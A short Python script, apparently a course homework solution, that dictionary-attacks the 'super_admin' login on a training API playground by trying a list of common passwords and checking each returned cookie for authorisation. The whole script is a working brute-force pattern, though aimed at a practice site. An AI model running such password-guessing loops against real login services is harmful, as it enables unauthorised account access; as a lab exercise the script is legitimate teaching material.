import requests

url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
check_url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
login = "super_admin"
passwords = ['123qwe', 'azerty', '123123', '111111', 'flower', 'princess', '1qaz2wsx', 'michael', 'zaq1zaq1', 'shadow',
             'hello', '000000', 'qazwsx', '888888', 'admin', 'superman', 'starwars', 'qwerty123', '696969', 'Football',
             'aa123456', 'qwertyuiop', 'welcome', '123456789', 'password', '!@#$%^&*', 'mustang', 'login', 'master',
             'adobe123[a]', '1234567890', 'access', 'jesus', 'trustno1', 'freedom', 'qwerty', 'donald', '123456',
             'football', '1q2w3e4r', 'baseball', 'monkey', 'photoshop[a]', '12345678', 'password1', 'abc123', '1234',
             'loveme', 'iloveyou', 'ashley', 'ninja', 'solo', 'bailey', '7777777', '121212', 'lovely', '24', '555555',
             'batman', 'sunshine', '654321', 'whatever', 'passw0rd', '12345', '666666', 'letmein', 'dragon', 'hottie',
             'charlie', '1234567']

correct_password = ""
for pswrd in passwords:
    response = requests.post(url, data={"login": login, "password": pswrd})
    cookie = response.cookies
    check_pass = requests.post(check_url, cookies=cookie)
    if check_pass.text == "You are authorized":
        correct_password = pswrd
        break

print(f'Password is "{correct_password}"')
